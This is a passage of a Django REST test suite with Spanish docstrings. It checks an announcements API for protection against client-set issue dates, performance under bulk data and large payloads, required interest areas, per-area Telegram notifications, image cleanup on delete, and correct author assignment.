        """
        Test: Casos de prueba - Seguridad

        Given: Un administrador autenticado intentando alterar la fecha de emisión.
        When: Envía un campo 'fecha_emision' manualmente en el JSON (ej. una fecha pasada).
        Then: El sistema debe rechazar la petición o ignorar el campo, asegurando 
            que la fecha de emisión sea generada automáticamente por el servidor.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        fecha_falsa = "2020-01-01T00:00:00Z"
        payload = {
            "titulo": "Comunicado con fecha manipulada",
            "contenido": "Intentando viajar al pasado.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id],
            "fecha_emision": fecha_falsa
        }

        response = self.client.post(self.url, data=payload, format='json')

        if response.status_code == status.HTTP_400_BAD_REQUEST:
            self.assertIn('error', response.data)
            self.assertIn('fecha_emision', response.data['error'])
            self.assertEqual(Comunicado.objects.count(), 0)

        else:
            self.assertEqual(response.status_code, status.HTTP_201_CREATED)
            comunicado = Comunicado.objects.get(id=response.data['id'])
            self.assertNotEqual(comunicado.fecha_emision.strftime("%Y-%m-%d"), "2020-01-01")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_get_comunicados_rendimiento_volumen_masivo(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Rendimiento

        Given: Una base de datos con un volumen alto de datos (1000 nuevos registros).
        When: Un usuario autenticado solicita el listado completo de comunicados.
        Then: El sistema debe responder en un tiempo aceptable y devolver todos los registros 
            existentes (1000 + los previos), confirmando que no hay paginación activa.
        """
        self.client.force_authenticate(user=self.usuario)

        conteo_inicial = Comunicado.objects.count()
        cantidad_nueva = 1000

        comunicados_batch = [
            Comunicado(
                titulo=f"Comunicado {i}",
                contenido=f"Contenido masivo {i}",
                tipo_comunicacion="GENERAL",
                autor=self.usuario
            ) for i in range(cantidad_nueva)
        ]
        Comunicado.objects.bulk_create(comunicados_batch)

        start_time = time.time()
        
        response = self.client.get(self.url)
        
        end_time = time.time()
        duration = end_time - start_time

        self.assertEqual(response.status_code, status.HTTP_200_OK)

        self.assertIsInstance(response.data, list)
        self.assertEqual(len(response.data), conteo_inicial + cantidad_nueva)

        self.assertLess(duration, 1.0, f"Rendimiento crítico: {duration}s para {len(response.data)} registros.")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_rendimiento_contenido_extenso(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Rendimiento

        Given: Un administrador autenticado intentando enviar un comunicado con contenido masivo.
        When: El campo 'contenido' tiene un tamaño de 2MB (aprox. 2 millones de caracteres).
        Then: El sistema debe procesar la petición sin lanzar un error 500, persistir el dato
            y manejar los servicios externos de forma eficiente.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        contenido_gigante = "A" * (2 * 1024 * 1024) 
        
        payload = {
            "titulo": "Comunicado de alta capacidad",
            "contenido": contenido_gigante,
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        start_time = time.time()
        
        response = self.client.post(self.url, data=payload, format='json')
        
        end_time = time.time()
        duration = end_time - start_time

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(id=response.data['id'])
        self.assertEqual(len(comunicado.contenido), len(contenido_gigante))

        self.assertLess(duration, 2.0, f"El procesamiento de payload grande fue lento: {duration}s")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_integridad_areas_obligatorias(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integridad de Negocio

        Given: Un administrador intentando crear un comunicado.
        When: El envío se realiza con la lista de 'areas_interes' vacía.
        Then: El sistema debe rechazar la creación con un error 400 (Bad Request),
            ya que todo comunicado debe estar categorizado en al menos un área.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        payload = {
            "titulo": "Anuncio sin destino",
            "contenido": "Contenido del mensaje.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": []
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('areas_interes', response.data)

        self.assertFalse(Comunicado.objects.filter(titulo="Anuncio sin destino").exists())



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_integridad_notificacion_multiple_areas(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integridad de Negocio

        Given: Un administrador creando un comunicado dirigido a múltiples áreas.
        When: Se envían varias áreas de interés, cada una con su propio canal de Telegram configurado.
        Then: El sistema debe crear un único comunicado pero disparar una notificación independiente 
            por cada canal de Telegram único asociado a esas áreas.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        area_caridad = AreaInteres.objects.create(nombre_area="Caridad", telegram_channel_id="-100111")
        area_cultos = AreaInteres.objects.create(nombre_area="Cultos", telegram_channel_id="-100222")

        self.area_juventud.telegram_channel_id = "-100333"
        self.area_juventud.save()

        payload = {
            "titulo": "Gran Convocatoria",
            "contenido": "Evento para todas las áreas.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id, area_caridad.id, area_cultos.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(id=response.data['id'])
        self.assertEqual(comunicado.areas_interes.count(), 3)

        self.assertEqual(mock_requests_post.call_count, 3)

        llamadas_chat_ids = []
        for call in mock_requests_post.call_args_list:
            if 'json' in call.kwargs:
                llamadas_chat_ids.append(call.kwargs['json']['chat_id'])
            elif 'data' in call.kwargs:
                llamadas_chat_ids.append(call.kwargs['data']['chat_id'])

        self.assertIn("-100111", llamadas_chat_ids)
        self.assertIn("-100222", llamadas_chat_ids)
        self.assertIn("-100333", llamadas_chat_ids)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_delete_comunicado_integridad_limpieza_archivos(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integridad de Gestión de Archivos

        Given: Un comunicado existente con una imagen de portada.
        When: El administrador solicita la eliminación y la transacción se confirma.
        Then: El sistema debe ejecutar el callback 'on_commit' para eliminar 
            físicamente el archivo del almacenamiento del servidor.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        imagen_mock = SimpleUploadedFile(
            name='test_image_cleanup.jpg',
            content=b'file_content',
            content_type='image/jpeg'
        )
        
        comunicado = Comunicado.objects.create(
            titulo="Comunicado con Foto",
            contenido="Texto con imagen",
            autor=self.usuario,
            imagen_portada=imagen_mock,
            tipo_comunicacion="GENERAL",
        )
        
        ruta_archivo = comunicado.imagen_portada.path
        self.assertTrue(os.path.exists(ruta_archivo))

        url_detalle = f"{self.url}{comunicado.id}/"
        
        with self.captureOnCommitCallbacks(execute=True):
            response = self.client.delete(url_detalle)

        self.assertEqual(response.status_code, status.HTTP_204_NO_CONTENT)
        self.assertFalse(Comunicado.objects.filter(id=comunicado.id).exists())

        self.assertFalse(os.path.exists(ruta_archivo), "El archivo de imagen no fue eliminado tras el commit simulado.")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_integridad_autor_es_usuario_autenticado(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integridad de Auditoría

        Given: Un administrador autenticado realizando una petición de creación.
        When: Se procesa la solicitud a través del servicio de creación.
        Then: El sistema debe garantizar que el campo 'autor' en la base de datos 
            coincida exactamente con el usuario que inició la petición (request.user),
            independientemente de si el campo se devuelve o no en la respuesta JSON.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        payload = {
            "titulo": "Validación de Autor",
            "contenido": "Verificando quién firma este comunicado.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(id=response.data['id'])
        self.assertEqual(comunicado.autor, self.usuario, 
                        "El autor en DB no coincide con el usuario de la petición.")

        if 'autor' in response.data:
            self.assertEqual(response.data['autor'], self.usuario.id)